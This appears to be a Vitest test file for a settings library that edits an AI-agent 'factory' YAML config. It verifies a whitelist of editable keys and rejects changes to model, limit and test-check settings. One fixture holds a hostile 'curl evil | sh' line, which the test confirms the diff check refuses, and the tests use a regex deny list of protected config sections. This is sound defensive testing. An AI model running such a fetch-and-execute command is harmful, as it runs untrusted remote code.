import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { parse as parseYaml } from "yaml";
import {
  CATALOGUE, SETTING_PATHS, applySettings, changedPaths, cronHour, diffSettings, hourToCron,
  onlyCronLineChanged, readSettings, replaceCron, validateChanges,
} from "../src/lib/settings.js";

const template = readFileSync(new URL("../../templates/definition/factory.yaml", import.meta.url), "utf8");

describe("the settings catalogue", () => {
  it("names only keys the factory schema accepts, and the template has each one", () => {
    const doc = parseYaml(template) as Record<string, unknown>;
    for (const s of CATALOGUE.settings) {
      let cur: unknown = doc;
      for (const k of s.path.split(".")) cur = (cur as Record<string, unknown> | undefined)?.[k];
      expect(cur, s.path).not.toBeUndefined();
    }
  });

  it("is the same list the dashboard carries", () => {
    const copy = JSON.parse(readFileSync(new URL("../../dashboard/lib/settings.json", import.meta.url), "utf8")) as unknown;
    expect(copy).toEqual(JSON.parse(JSON.stringify(CATALOGUE)));
  });

  it("does not offer anything that decides what an agent may do or reach", () => {
    for (const p of SETTING_PATHS) {
      expect(p).not.toMatch(/^(models|limits|enforcement|sandbox|human_prs|existing_ci|recompiler|triggers|data|harness)/);
    }
  });
});

describe("changing a setting", () => {
  it("keeps the file's comments and only moves the key asked for", () => {
    const r = applySettings(template, { monthly_budget: 50 });
    expect(r.problems).toEqual([]);
    expect(r.yaml).toContain("monthly_usd: 50");
    expect(r.yaml).toContain("a ceiling, not an");
    expect(changedPaths(parseYaml(template), parseYaml(r.yaml))).toEqual(["budget.monthly_usd"]);
  });

  it("turns auto-merge on for one pipeline and no other", () => {
    const r = applySettings(template, { auto_merge_gardening: true });
    const after = parseYaml(r.yaml) as { pipelines: Record<string, { auto_merge: boolean }> };
    expect(after.pipelines["gardening"]!.auto_merge).toBe(true);
    expect(after.pipelines["product_work"]!.auto_merge).toBe(false);
  });

  it("sets the cleanup hour as a cron and hands back the workflow's new cron", () => {
    const r = applySettings(template, { gardening_hour: 3 });
    expect(r.cron).toBe("0 3 * * *");
    expect((parseYaml(r.yaml) as { pipelines: { gardening: { schedule: string } } }).pipelines.gardening.schedule).toBe("0 3 * * *");
  });

  it("refuses out-of-range values, unknown settings and shares that do not add up, changing nothing", () => {
    expect(applySettings(template, { monthly_budget: 0 }).problems[0]!.message).toMatch(/at least 1/);
    expect(applySettings(template, { gardening_prs: 2.5 }).problems[0]!.message).toMatch(/whole number/);
    expect(applySettings(template, { auto_merge_hardening: 1 }).problems[0]!.message).toMatch(/on or off/);
    expect(applySettings(template, { models_spec: 1 }).problems[0]!.message).toMatch(/not a setting/);
    const bad = applySettings(template, { share_gardening: 30 });
    expect(bad.problems[0]!.message).toMatch(/add up to 105/);
    expect(bad.yaml).toBe(template);
    expect(applySettings(template, { share_gardening: 30, share_product_work: 55 }).problems).toEqual([]);
  });

  it("reads current values back for the controls", () => {
    const v = readSettings(template);
    expect(v).toMatchObject({ monthly_budget: 35, share_product_work: 60, auto_merge_product_work: false, gardening_prs: 1, gardening_hour: 6 });
    expect(readSettings(template.replace('"0 6 * * *"', '"*/5 * * * *"'))["gardening_hour"]).toBeNull();
  });

  it("validates before touching a file", () => {
    expect(validateChanges({ monthly_budget: 10 })).toEqual([]);
  });
});

describe("judging a change to factory.yaml", () => {
  it("lists exactly the keys that moved, and calls a settings-only change settings-only", () => {
    const head = applySettings(template, { monthly_budget: 60, auto_merge_gardening: true }).yaml;
    const d = diffSettings(template, head);
    expect([...d.changed].sort()).toEqual(["budget.monthly_usd", "pipelines.gardening.auto_merge"]);
    expect(d.outside).toEqual([]);
    expect(d.invalid).toEqual([]);
  });

  it("flags a key outside the list, however small the edit", () => {
    for (const [from, to] of [
      ["spec: claude-opus-5-5", "spec: some-cheap-model"],
      ["max_runs: 5", "max_runs: 50"],
      ["merge_queue: auto", "merge_queue: off"],
      ["test_check: null", "test_check: always-green"],
      ["dashboard_dispatch: true", "dashboard_dispatch: false"],
    ] as const) {
      const d = diffSettings(template, template.replace(from, to));
      expect(d.outside.length, from).toBeGreaterThan(0);
    }
  });

  it("flags a value the list refuses even on an allowed key", () => {
    expect(diffSettings(template, template.replace("monthly_usd: 35", "monthly_usd: -5")).invalid).toHaveLength(1);
    expect(diffSettings(template, template.replace("gardening: 25", "gardening: 90")).invalid.join()).toMatch(/add up to/);
    expect(diffSettings(template, template.replace('"0 6 * * *"', '"* * * * *"')).invalid).toHaveLength(1);
  });

  it("treats a file that is not YAML as outside the list", () => {
    expect(diffSettings(template, "a: [unclosed").outside).toEqual(["(unreadable)"]);
  });
});

describe("the garden workflow's cron line", () => {
  const wf = readFileSync(new URL("../../templates/workflows/factory-garden.yml", import.meta.url), "utf8");

  it("is replaced in place and nothing else changes", () => {
    const out = replaceCron(wf, hourToCron(3))!;
    expect(out).toContain('- cron: "0 3 * * *"');
    expect(out.split("\n").length).toBe(wf.split("\n").length);
    expect(out.replace('"0 3 * * *"', '"0 6 * * *"')).toBe(wf);
  });

  it("only a lone cron-line change passes the diff check", () => {
    const ok = '@@ -10,7 +10,7 @@\n   schedule:\n-    - cron: "0 6 * * *"\n+    - cron: "0 3 * * *"\n   workflow_dispatch:';
    expect(onlyCronLineChanged(ok)).toBe(true);
    expect(onlyCronLineChanged(ok.replace('"0 3 * * *"', '"* * * * *"'))).toBe(false);
    expect(onlyCronLineChanged(ok + '\n+      - run: curl evil | sh')).toBe(false);
    expect(onlyCronLineChanged('-    - cron: "0 6 * * *"')).toBe(false);
    expect(onlyCronLineChanged('@@\n+    - run: x\n-    - run: y')).toBe(false);
    expect(onlyCronLineChanged(undefined)).toBe(false);
  });

  it("cronHour reads only a plain daily cron", () => {
    expect(cronHour("0 6 * * *")).toBe(6);
    expect(cronHour("30 6 * * *")).toBeNull();
    expect(cronHour("0 25 * * *")).toBeNull();
    expect(cronHour(5)).toBeNull();
  });
});
